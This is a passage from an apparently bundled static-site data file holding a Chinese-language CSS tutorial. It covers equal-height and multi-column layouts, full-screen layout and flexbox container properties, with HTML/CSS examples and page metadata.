/*单元格与单元格之间，水平间距20px，垂直间距0*/\n            border: 1px solid red;\n        }\n        .col { display: table-cell; height: 100px }\n        .cell1 { background-color: red; }\n        .cell2 { background-color: yellow; }\n        .cell3 { background-color: blue; }\n        .cell4 { background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n      <div class="col cell1"></div>\n      <div class="col cell2"></div>\n      <div class="col cell3"></div>\n      <div class="col cell4"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n空白间隔问题其实有一种更好的办法规避，那就是直接使用弹性盒布局配合justify-content属性，都不需要上面这些计算过程，空白间隔大小自动分配。\n\n\n# 五、等高布局\n\n等高布局把一行分成若干列，这些列的高度都相等。它的实现一般有两种：1.表格，2.溢出配合边距。\n\n\n# 5.1 使用表格\n\n我们知道表格的高度和单元格高度是自动计算的，也就说它的高度是根据内容多少来显示的。那么同一行的高度呢？其实是默认相等的，除了跨行以外。\n\n当然，基本的设置还是要有的，表格display值，单元格display值，表格要固定宽度并且显示设置宽度。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent { display: table; table-layout: fixed; width: 600px; }\n        .left { display: table-cell; background-color: red; }\n        .right { display: table-cell; background-color: yellow; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="left"></div>\n        <div class="right">css1：1996年12月正式推出css1，对字体、尺寸、颜色、文本、位置、背景、边框等进行了规范，这个阶段主要使用table和css1来定位表单的外观和样式。\n        css2：1998年5月正式推出css2，扩展了css1，添加了很多新属性和伪元素，这个阶段主要使用div和li来分割元素再搭配css2来定义表单界面的外观。\n        css2.1：2004年2月正式推出了css2.1，纠正了css2中的一些错误，也删除了一些不被浏览器所支持的属性（有些出现在css3规范中了）。\n        css3：2010年推出的全新版本css3，被分为若干个相互独立的模块，包括盒子模型、列表模块、超链接方式、语言模块、背景和边框、文字特效、多栏布局等模块。</div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 5.2 溢出配合边距\n\n这种方法非常巧妙，在学习使用这种方法时，最好了解一下边距对盒子的影响，还需要了解overflow: hidden的触发临界点。\n\n具体是让父级元素设置overflow: hidden，子级浮动并且设置padding-bottom: 9999px;和margin-bottom: -9999px;这种特殊的处理方式。这种特殊的处理方式有几种叫法：内外补丁负值法、内边距补偿法。\n\n分析：\n\n * 我们期望的效果是父容器的高度是随着最高列的内容高度来自动调整的。其他几列内容高度肯定是不如最高列的，那就需要使用内边距补偿短缺的高度。因为内边距算作展示效果里的，所有这个方法的等高布局是一种伪登高布局。\n * 但是我们并不清楚实际场景中哪一列会是最高列，所以给所有列都设置了padding，除最高列的其他列要补偿的高度并不相同，那可以先让padding都取一个超大值，再使用overflow: hidden将多余的展示尺寸都截取掉，这样就可以形成一个视觉上等高的几列。\n * 我们知道这个父容器的高度并没有显示设置，它是依赖于子元素的布局尺寸撑起来的，而之前又使用了padding，它既增大了布局尺寸也增大了展示尺寸，那么父容器的边界此时肯定是一直包裹这子元素的边界的，也就是说overflow: hidden并不会生效。\n * 刚好margin取负值可以减少布局尺寸但又不影响展示尺寸，这样就可以让overflow: hidden生效了。还有就是，期望让父容器的高度是随着最高列的内容高度来自动调整，那就让padding和margin的绝对值相等，最后剩下的布局尺寸就是最高列的内容高度了。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent { overflow: hidden; width: 600px;}\n        .col { float: left; padding-bottom: 9999px; margin-bottom: -9999px; }\n        .left { width: 50%; background-color: red; }\n        .right { width: 50%; background-color: yellow; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col left">css</div>\n        <div class="col right">css1：1996年12月正式推出css1，对字体、尺寸、颜色、文本、位置、背景、边框等进行了规范，这个阶段主要使用table和css1来定位表单的外观和样式。\n        css2：1998年5月正式推出css2，扩展了css1，添加了很多新属性和伪元素，这个阶段主要使用div和li来分割元素再搭配css2来定义表单界面的外观。</div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n其实每列的实际高度就是每列的contentarea高度，视觉上的等高是每列contentarea高度加上“还留在父元素框内的padding高度”，多余的padding都被overflow: hidden截掉了。\n\n\n# 六、css3中的多列布局\n\n\n# 6.1 列数和最小宽度\n\ncss3中通过column-count属性来对一个元素的内容进行多列布局，该属性的值可以是auto表示由css自动分配，也可以是一个整数表示有几列。\n\n还有一个属性是column-width，表示列的宽度或者列的最小宽度，也可以设置auto也可以设置一个数值。\n\n其实这两个属性可以简写在一起，比如column-count: 4; column-width: 100px;其实是可以简写成columns: 4 100px;，千万要注意是columns而不是column。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent { border: 1px solid red; width: 600px; column-count: 4; column-width: 100px; }\n        .col1 { height: 100px; background-color: red; }\n        .col2 { height: 100px; background-color: yellow; }\n        .col3 { height: 100px; background-color: blue; }\n        .col4 { height: 100px; background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n        <div class="col4"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 6.2 空白间隔、间隔边框\n\ncolumn-gap这个属性可以更改列与列之间的空白间隔，默认值是normal对应的是1em的长度，可以设置具体数值（正整数）。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent { border: 1px solid red; width: 600px; columns: 4 100px; column-gap:20px; }\n        .col1 { height: 100px; background-color: red; }\n        .col2 { height: 100px; background-color: yellow; }\n        .col3 { height: 100px; background-color: blue; }\n        .col4 { height: 100px; background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n        <div class="col4"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\ncolumn-rule这个属性是用来设置列与列之间的边框的，它有三个方面：边框宽度、边框颜色和边框样式。可以分开写：column-rule-width、column-rule-color和column-rule-style。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            width: 600px; border: 1px solid red; columns: 4 100px;\n            column-gap:20px; column-rule: 2px solid green;\n        }\n        .col1 { height: 100px; background-color: red; }\n        .col2 { height: 100px; background-color: yellow; }\n        .col3 { height: 100px; background-color: blue; }\n        .col4 { height: 100px; background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n        <div class="col4"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n可以看到空白间隔的宽度是包含里column-rule的宽度，也就是说column-rule的宽度不会自己再占空间。\n\n\n# 6.3 横跨所有列\n\ncolumn-span这个属性是为某列设置是否横跨所有列，默认值是none表示不跨列，all表示跨所有列。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            width: 600px; border: 1px solid red; columns: 4 100px;\n            column-gap:20px; column-rule: 2px solid green;\n        }\n        .col1 { height: 100px; background-color: red; }\n        .col2 { height: 100px; background-color: yellow; }\n        .col3 { height: 100px; background-color: blue; }\n        .col4 { height: 100px; background-color: green; }\n        .col5 { height: 100px; background-color: skyblue; column-span: all; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n        <div class="col4"></div>\n        <div class="col5"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 七、全屏布局\n\n全屏布局指的是html铺满整个浏览器页面，没有水平和垂直的滚动条，让html跟着页面大小变化而变化。\n\n\n\n跟圣杯布局差不多。\n\n<html>\n<head>\n    <style type="text/css">\n        body, html { margin: 0; }\n        .header {\n            position: fixed; width: 100%; height: 100px;\n            top: 0; left: 0; right: 0; background-color: skyblue;\n        }\n        .footer {\n            position: fixed; width: 100%; height: 100px;\n            bottom: 0; left: 0; right: 0; background-color: lightblue;\n        }\n        .content {\n            position: fixed; width: 100%; top: 100px;\n            bottom: 100px; left: 0; right: 0; background-color: red;\n        }\n        .left {\n            float: left; width: 400px; height: 100%;\n            overflow: auto; background-color: yellow;\n        }\n        /*.right {\n            float: left; width: calc(100% - 400px); height: 100%;\n            overflow: auto; background-color: green;\n        }*/\n        .right {\n            height: 100%; margin-left: 400px;\n            overflow: auto; background-color: green;\n        }\n    </style>\n</head>\n<body>\n    <div class="header"></div>\n    <div class="content">\n        <div class="left"></div>\n        <div class="right"></div>\n    </div>\n    <div class="footer"></div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n',charsets:{cjk:!0}},{title:"8.弹性盒布局",frontmatter:{title:"8.弹性盒布局"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/8.%E5%BC%B9%E6%80%A7%E7%9B%92%E5%B8%83%E5%B1%80.html",relativePath:"book-web/html、css、js、ts/学习CSS/8.弹性盒布局.md",key:"v-75f6d2a5",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/8.%E5%BC%B9%E6%80%A7%E7%9B%92%E5%B8%83%E5%B1%80.html",headers:[{level:2,title:"一、弹性盒简介",slug:"一、弹性盒简介",normalizedTitle:"一、弹性盒简介",charIndex:12},{level:2,title:"二、flex容器",slug:"二、flex容器",normalizedTitle:"二、flex容器",charIndex:580},{level:3,title:"2.1 主轴和交叉轴",slug:"_2-1-主轴和交叉轴",normalizedTitle:"2.1 主轴和交叉轴",charIndex:718},{level:3,title:"2.2 flex-direction",slug:"_2-2-flex-direction",normalizedTitle:"2.2 flex-direction",charIndex:955},{level:3,title:"2.3 flex-wrap",slug:"_2-3-flex-wrap",normalizedTitle:"2.3 flex-wrap",charIndex:3114},{level:3,title:"2.4 flex-flow",slug:"_2-4-flex-flow",normalizedTitle:"2.4 flex-flow",charIndex:4725},{level:3,title:"2.5 justify-content",slug:"_2-5-justify-content",normalizedTitle:"2.5 justify-content",charIndex:6368},{level:3,title:"2.6 等分布局改造",slug:"_2-6-等分布局改造",normalizedTitle:"2.6 等分布局改造",charIndex:9482},{level:3,title:"2.7 align-items",slug:"_2-7-align-items",normalizedTitle:"2.7 align-items",charIndex:10370},{level:3,title:"2.8 align-content",slug:"_2-8-align-content",normalizedTitle:"2.8 align-content",charIndex:14673},{level:2,title:"三、flex项",slug:"三、flex项",normalizedTitle:"三、flex项",charIndex:19923},{level:3,title:"3.1 flex项上的无效设置",slug:"_3-1-flex项上的无效设置",normalizedTitle:"3.1 flex项上的无效设置",charIndex:20020},{level:3,title:"3.2 flex-grow",slug:"_3-2-flex-grow",normalizedTitle:"3.2 flex-grow",charIndex:23397},{level:3,title:"3.3 flex-shrink",slug:"_3-3-flex-shrink",normalizedTitle:"3.3 flex-shrink",charIndex:24926},{level:3,title:"3.4 flex-basis",slug:"_3-4-flex-basis",normalizedTitle:"3.4 flex-basis",charIndex:27281},{level:3,title:"3.5 flex",slug:"_3-5-flex",normalizedTitle:"3.5 flex",charIndex:33033},{level:3,title:"3.6 align-self",slug:"_3-6-align-self",normalizedTitle:"3.6 align-self",charIndex:40900},{level:3,title:"3.7 order",slug:"_3-7-order",normalizedTitle:"3.7 order",charIndex:41096}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、弹性盒简介 二、flex容器 2.1 主轴和交叉轴 2.2 flex-direction 2.3 flex-wrap 2.4 flex-flow 2.5 justify-content 2.6 等分布局改造 2.7 align-items 2.8 align-content 三、flex项 3.1 flex项上的无效设置 3.2 flex-grow 3.3 flex-shrink 3.4 flex-basis 3.5 flex 3.6 align-self 3.7 order",content:'# 弹性盒布局\n\n\n# 一、弹性盒简介\n\n弹性盒(Flexbox)布局是一种用于按行或按列布局元素的一维布局方法。元素可以膨胀以填充额外的空间，收缩以适应更小的空间，也就说这种布局可以适应不同屏幕尺寸或不同设备。\n\n通过声明display: flex或display: inline-flex在元素上激活Flexbox布局。该元素会作为一个flex容器，控制内部的子元素（flex项）进行布局。这里需要说明的一点，是flex容器的直接子元素作为flex项，其他后代还是正常展示和布局。\n\n在flex容器中，flex项就可以在主轴上排列，主轴可以是垂直或者水平，也就是说按照行或列来排列。然后可以让flex项居左、居中或居右来显示，当然也可以分散开来。有对应的属性处理flex项填不满时对出的的空间，也有对应的属性处理flex项占用过多空间时flex项应该要怎么调整。\n\n弹性盒布局可以解决的哪些问题？之前的圣杯布局，就使用了浮动让几个div形成列，再用负值外边距来让左右两列上移。还有等分布局，也要使用负值外边距来处理多出的空白间隙。还有等高布局，就使用了padding-bottom: 9999px;和margin-bottom: -9999px;这种奇怪样式。对于不太精通盒模型的人来说，真是丈二和尚摸不着头脑，那么弹性盒布局就可以解决这些问题。\n\n\n# 二、flex容器\n\nflex容器是一个“容器”，换句话说，它是一个“格式上下文”。在BFC就提到过这个概念，它是页面中一个独立的渲染区域，拥有自己的渲染规则，会隔离内部元素与外部元素。\n\n了解完“容器”后，我们去学习关于flex容器的一些设置，学习怎么控制内部元素。\n\n\n# 2.1 主轴和交叉轴\n\n后面会经常提到“主轴”和“交叉轴”，让我们来看一下它们到底是什么。\n\n\n\n * 主轴（main axis）是沿着 flex 元素放置的方向延伸的轴。该轴的开始和结束被称为main start和main end。\n * 交叉轴（cross axis）是垂直于 flex 元素放置方向的轴。该轴的开始和结束被称为cross start和cross end。\n * main size是内容沿主轴的长度，cross size是内容沿交叉轴的长度。\n\n\n# 2.2 flex-direction\n\nflex-direction是用来控制flex容器的主轴是水平还是垂直方向的。它的值有row（默认值）、row-reverse、column、column-reverse，在“自左到右”的语言下（比如英文中文），它们分别表示的“从左到右”、“从右到左”、“从上到下”以及“从下到上”的排列顺序。\n\n准确来说，row应该是当前书写模式下内联元素排列的方向（row-reverse就是内联排列反方向），column是当前书写模式下块级元素排列的方向（column-reverse就是块级排列反方向）。比如日语是垂直的书写模式，那么row是垂直方向，而column对应的是水平方向了。\n\n至于书写模式的调整，一般与writing-mode、text-orientation、direction以及html的dir有关，可以看一下之前的章节——书写模式。\n\n<html>\n<head>\n    <style contenteditable="">\n    div { background-color: rgba(0,0,0,0.1); }\n    article > div { display: flex; border: 1px dashed; padding: 10px; }\n    p { text-align: center; }\n    div > div {\n        border: 1px solid;\n        height: 35px;\n        padding: 0 5px;\n        margin: 10px;\n        line-height: 40px;\n        text-align: center;\n        flex: 1 1 auto;\n    }\n    article:nth-of-type(3) { width: 45%; float: left; }\n    article:nth-of-type(4) { width: 45%; float: right; }\n    div > div:nth-of-type(2) { background-color: rgba(0,0,0,0.2); }\n    div > div:nth-of-type(3) { background-color: rgba(0,0,0,0.3); }\n    div > div:nth-of-type(4) { background-color: rgba(0,0,0,0.4); }\n    div > div:nth-of-type(5) { background-color: rgba(0,0,0,0.5); }\n    </style>\n</head>\n<body>\n    <article>\n      <p>flex-direction: row;</p>\n      <div style="flex-direction: row;">\n        <div>1</div><div>2</div><div>3</div><div>4</div><div>5</div>\n      </div>\n    </article>\n    <article>\n      <p>flex-direction: row-reverse;</p>\n      <div style="flex-direction: row-reverse;">\n        <div>1</div><div>2</div><div>3</div><div>4</div><div>5</div>\n      </div>\n    </article>\n    <article>\n      <p>flex-direction: column;</p>\n      <div style="flex-direction: column;">\n        <div>1</div><div>2</div><div>3</div><div>4</div><div>5</div>\n      </div>\n    </article>\n    <article>\n      <p>flex-direction: column-reverse;</p>\n      <div style="flex-direction: column-reverse;">\n        <div>1</div><div>2</div><div>3</div><div>4</div><div>5</div>\n      </div>\n    </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n代码效果图：\n\n\n\n# 2.3 flex-wrap\n\n如果flex项不能全部放入flex容器的主轴上，默认情况下flex项不会换行，flex项会溢出或者调整大小。flex-wrap属性就可以让放不下的flex项进行换行，它的值有nowrap（默认值）、wrap、wrap-reverse。其中wrap是向交叉轴正方向进行换行，wrap-reverse是向交叉轴反方向进行换行。\n\n要特别提一点，放不放得下是考虑的是布局尺寸，这跟浮动上跳是一样的基本规则。还有另外一点，flex项不换行，flex项不见得是溢出，可能是调整大小，可以看flex-shrink这节。\n\n<html>\n<head>\n    <style>\n    article { width: 450px; }\n    div { background-color: rgba(0,0,0,0.1); font-family: monospace; }\n    article > div { display: flex; border: 1px dashed; padding: 10px; }\n    div > div { border: 1px solid; margin: 10px; padding: 0.5em 1em; text-align: center; }\n    p { text-align: center; }\n    </style>\n</head>\n<body>\n    <article>\n        <p>flex-wrap: nowrap;</p>\n        <div style="flex-wrap: nowrap">\n          <div>A</div><div>BB</div><div>CCC</div><div>DDDD</div><div>EEE<br>EE</div>\n          <div>FFF<br>FFF</div><div>GGGG<br>GGGG</div><div>HHH<br>HHH<br>HHH</div>\n        </div>\n    </article>\n    <article>\n        <p>flex-wrap: wrap;</p>\n        <div style="flex-wrap: wrap">\n          <div>A</div><div>BB</div><div>CCC</div><div>DDDD</div><div>EEE<br>EE</div>\n          <div>FFF<br>FFF</div><div>GGGG<br>GGGG</div><div>HHH<br>HHH<br>HHH</div>\n        </div>\n    </article>\n    <article>\n        <p>flex-wrap: wrap-reverse;</p>\n        <div style="flex-wrap: wrap-reverse">\n          <div>A</div><div>BB</div><div>CCC</div><div>DDDD</div><div>EEE<br>EE</div>\n          <div>FFF<br>FFF</div><div>GGGG<br>GGGG</div><div>HHH<br>HHH<br>HHH</div>\n        </div>\n    </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n以上代码效果图：\n\n\n\n# 2.4 flex-flow\n\nflex-flow属性其实就是flex-direction和flex-wrap的合并写法，比如flex-flow: row wrap、flex-flow: wrap column。我们强烈建议使用该属性替代那两种属性。\n\n<html>\n<head>\n    <style>\n    /* 为了让article的height: 70%生效 */\n    body, html { height: 100%; margin: 0; }\n    article { float: left; width: 30%; margin: 0 1.5%; height: 60%; }\n    div { background-color: rgba(0,0,0,0.1); font-family: monospace; }\n    article > div { display: flex; height: 95%; border: 1px dashed; padding: 10px; }\n    div > div { border: 1px solid; margin: 10px; padding: 0.5em; text-align: center; }\n    p { text-align: center; }\n    </style>\n</head>\n<body>\n    <article>\n        <p>flex-flow: column nowrap;</p>\n        <div style="flex-flow: column nowrap">\n          <div>A</div><div>BB</div><div>CCC</div><div>DDDD</div><div>EEE<br>EE</div>\n          <div>FFF<br>FFF</div><div>GGGG<br>GGGG</div><div>HHH<br>HHH<br>HHH</div>\n        </div>\n    </article>\n    <article>\n        <p>flex-flow: column wrap;</p>\n        <div style="flex-flow: column wrap">\n          <div>A</div><div>BB</div><div>CCC</div><div>DDDD</div><div>EEE<br>EE</div>\n          <div>FFF<br>FFF</div><div>GGGG<br>GGGG</div><div>HHH<br>HHH<br>HHH</div>\n        </div>\n    </article>\n    <article>\n        <p>flex-flow: column wrap-reverse;</p>\n        <div style="flex-flow: column wrap-reverse">\n          <div>A</div><div>BB</div><div>CCC</div><div>DDDD</div><div>EEE<br>EE</div>\n          <div>FFF<br>FFF</div><div>GGGG<br>GGGG</div><div>HHH<br>HHH<br>HHH</div>\n        </div>\n    </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n以上代码效果图：\n\n\n\n# 2.5 justify-content\n\njustify-content属性设置在flex容器上，用于决定flex项在主轴上的对齐方式。它的值有flex-start | flex-end | center | space-between | space-around | space-evenly。\n\n * flex-start：默认值，让所有flex项进行主轴start方向对齐，也就是让剩余空间全部放到主轴end方向。\n * flex-end：让所有flex项进行主轴end方向对齐，也就是让剩余空间全部放到主轴start方向。\n * center：让所有flex项在主轴中间对齐，也就是让剩余空间放到主轴两边，flex项之间不留空隙。\n * space-between：flex项之间的空间会相同，第一个flex项与start之间不留空隙，最后一个flex项与end之间不留空隙。\n * space-around：flex项之间的空间会相同，第一个flex项与start有空隙而其数值是flex项之间空隙的一半，最后一个flex项与end有空隙而其数值是flex项之间空隙的一半。\n * space-evenly：flex项之间的空间会相同，第一个flex项与start有空隙而其数值就等于flex项之间的空隙，最后一个flex项与end有空隙而其数值就等于flex项之间的空隙。\n\n<html>\n<head>\n    <style>\n    div { background-color: rgba(0,0,0,0.1); font-family: monospace; }\n    article { margin: 15px auto; }\n    article > div { display: flex; border: 1px dashed; }\n    div > div { border: 1px solid; height: 30px; margin: 5px; padding: 5px; line-height: 30px; text-align: center; }\n    p { text-align: center; margin-bottom: 3px; }\n    </style>\n</head>\n<body>\n<article>\n  <p>justify-content: flex-start; </p>\n  <div style="justify-content: flex-start;">\n    <div>A</div>\n    <div>BBB</div>\n    <div>CCCCCC</div>\n  </div>\n</article>\n<article>\n  <p>justify-content: flex-end;</p>\n  <div style="justify-content: flex-end;">\n    <div>A</div>\n    <div>BBB</div>\n    <div>CCCCCC</div>\n  </div>\n</article>\n<article>\n  <p>justify-content: center;</p>\n  <div style="justify-content: center;">\n    <div>A</div>\n    <div>BBB</div>\n    <div>CCCCCC</div>\n  </div>\n</article>\n<article>\n  <p>justify-content: space-between;</p>\n  <div style="justify-content: space-between;">\n    <div>A</div>\n    <div>BBB</div>\n    <div>CCCCCC</div>\n  </div>\n</article>\n<article>\n  <p>justify-content: space-around;</p>\n  <div style="justify-content: space-around;">\n    <div>A</div>\n    <div>BBB</div>\n    <div>CCCCCC</div>\n  </div>\n</article>\n<article>\n  <p>justify-content: space-evenly;</p>\n  <div style="justify-content: space-evenly;">\n    <div>A</div>\n    <div>BBB</div>\n    <div>CCCCCC</div>\n  </div>\n</article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n以上代码效果图：\n\n\n如果主轴上没有剩余空间，使用justify-content，溢出会是个什么情况？换行又会是个什么情况？\n\n 1. justify-content：flex-start就是默认情况，它的溢出表现还有换行表现也是默认情况就不赘述了。\n\n 2. justify-content：flex-end让元素在end端对齐，但是元素的顺序是从start到end，那么溢出表现就是start这一端溢出了；换行表现的话与上一行一样，在end端对齐。可以看下面的示意图。\n    \n    \n\n 3. justify-content：center让元素在中间对齐，元素的顺序是从start到end，那么溢出表现应该是start和end两端都会溢出；换行表现的话与上一行一样，在中间对齐。可以看下面的示意图。\n    \n    \n\n 4. justify-content：space-between让首尾元素紧挨着start和end，空间平分。感觉溢出从哪端都一样，其实就是采用的默认溢出也就是end这一端溢出；换行表现的话与上一行一样，让首尾元素紧挨着start和end，空间平分。可以看下面的示意图。\n    \n    \n\n 5. justify-content：space-around像是center对齐，只不过让剩余空间分布在了flex之间，最后靠近start和end的空间只有一半大小。溢出与center情况一样，也就是从start和end两端溢出的；换行表现的话与上一行一样，flex项之间空间相同，靠近start和end的空间只有flex项之间空间一半大小。可以看下面的示意图。\n    \n    \n\n 6. justify-content：space-evenly也像是center对齐，只不过让剩余空间分布在了flex之间，最后靠近start和end的空间也与flex项之间空间相等。溢出与center情况一样，也就是从start和end两端溢出的；换行表现的话与上一行一样，flex项之间空间相同，靠近start和end的空间与flex项之间空间相等。可以看下面的示意图。\n    \n    \n\n\n# 2.6 等分布局改造\n\n在上一章的等分布局是使用浮动实现的，会有空白间隔问题，虽然可以使用外边距来解决，然后为了让空白间隔与每列进行关联，还使用了稍微复杂点的计算。如果我们使用弹性盒布局，再配合justify-content属性控制剩余空间，就可以很好的解决这些问题。\n\n<html>\n<head>\n    <style type="text/css">\n    /* 少一个空隙的话可以将space-evenly换成space-between */\n    .parent { display: flex; justify-content: space-evenly; border: 1px solid red; width: 500px; }\n    .parent > div { width: 20%; height: 100px; }\n    .parent > div:nth-of-type(1) { background-color: red; }\n    .parent > div:nth-of-type(2) { background-color: yellow; }\n    .parent > div:nth-of-type(3) { background-color: blue; }\n    .parent > div:nth-of-type(4) { background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col"></div>\n        <div class="col"></div>\n        <div class="col"></div>\n        <div class="col"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 2.7 align-items\n\nalign-items设置在flex容器上，用于决定一行中的flex项在交叉轴上的对齐方式。它的值有flex-start | flex-end | center | baseline | stretch。\n\n与内联元素在垂直方向的对齐方式很像，align-items会控制一行中高低不齐的flex项进行某种“垂直”方向的对齐。\n\n * flex-start：让flex项与交叉轴的start对齐。flex-direction: row的话，就是顶部对齐，是布局尺寸顶部。\n * flex-end：让flex项与交叉轴的end对齐。flex-direction: row的话，就是底部对齐，是布局尺寸底部。\n * center：让flex项的中心与交叉轴长度的中点对齐。注意是布局尺寸交叉轴方向上的中心点，也就是要算margin（即使负值）。\n * baseline：让flex项的baseline与这一行的baseline对齐。\n * stretch：默认值，让可拉伸的flex项进行拉伸，拉伸到与这一行高度最大的flex项一样的高度。拉伸的参考者和被拉伸者，都作用于布局尺寸的。\n\n<html>\n<head>\n    <style>\n    article { width: 500px; display: flow-root; margin: 10px;}\n    div { background-color: rgba(0,0,0,0.1); font-family: monospace; }\n    p { float: left; text-align: center; width: 200px; height: 100px; line-height: 100px; margin: 0px; }\n    article > div { float: left; display: flex; flex-flow: row nowrap; border: 1px dashed; padding: 10px; }\n    div > div { border: 1px solid; margin: 5px 10px; padding: 0.5em; text-align: center; }\n    </style>\n</head>\n<body>\n    <article>\n        <p>align-items: flex-start;</p>\n        <div style="align-items: flex-start;">\n          <div>One</div><div>Two<br>Two</div><div>Three<br>Three<br>Three</div>\n          <div>Four<br>Four<br>Four<br>Four</div>\n        </div>\n    </article>\n    <article>\n        <p>align-items: flex-end;</p>\n        <div style="align-items: flex-end;">\n          <div>One</div><div>Two<br>Two</div><div>Three<br>Three<br>Three</div>\n          <div>Four<br>Four<br>Four<br>Four</div>\n        </div>\n    </article>\n    <article>\n        <p>align-items: center;</p>\n        <div style="align-items: center;">\n          <div>One</div><div>Two<br>Two</div><div>Three<br>Three<br>Three</div>\n          <div>Four<br>Four<br>Four<br>Four</div>\n        </div>\n    </article>\n    <article>\n        <p>align-items: stretch;</p>\n        <div style="align-items: stretch;">\n          <div>One</div><div>Two<br>Two</div><div>Three<br>Three<br>Three</div>\n          <div>Four<br>Four<br>Four<br>Four</div>\n        </div>\n    </article>\n    <article>\n        <p>align-items: baseline;</p>\n        <div style="align-items: baseline;">\n          <div>One</div><div>Two<br>Two</div><div>Three<br>Three<br>Three</div>\n          <div>Four<br>Four<br>Four<br>Four</div>\n        </div>\n    </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n以上代码效果图：\n\n\nalign-items: flex-start、align-items: flex-end以及align-items: center都还挺简单的。\n\nalign-items: stretch是有拉伸有限制的，设置height是不能拉伸了，设置max-heigh时拉伸不能超过这个高度。其他的压缩也类似的限制。然后需要注意的是，被作为拉伸参考对象的flex项以及被拉伸的flex项，它们都是拿布局尺寸来说的，并不是把border框拉伸到一样高度。\n\nalign-items: baseline和内联排列中的baseline不是很相同。因为确定flex项的baseline时，是考虑flex项内部第一行文本的baseline位置的（内联排列一般是最后一行），当然，如果flex项内部没有内容，那flex项的baseline是flex项的margin-bottom位置（受flex-direction影响）。然后再去确定flex容器这一行的baseline，所有flex项baseline距离这行顶部最远的，会作为这一行最终的baseline。\n\n<html>\n<head>\n    <style>\n    div { background-color: rgba(0,0,0,0.1); }\n    article { position: relative; width: 350px; }\n    article > div { display: flex; flex-flow: row wrap; border: 1px dashed; }\n    article > div > div { border: 1px solid; margin: 0 10px; text-align: center; }\n    .c, .h {  margin-top: 10px; }\n    .d, .i { margin-top: 20px; }\n    .j { font-size: 3rem; }\n    p { text-align: center; }\n    .f:after, .j:after {\n        content: \'\';\n        position: absolute;\n        left: 0;\n        right: 0;\n        border-top: 1px solid green;\n    }\n    .f:after{ top: 4.72em; }\n    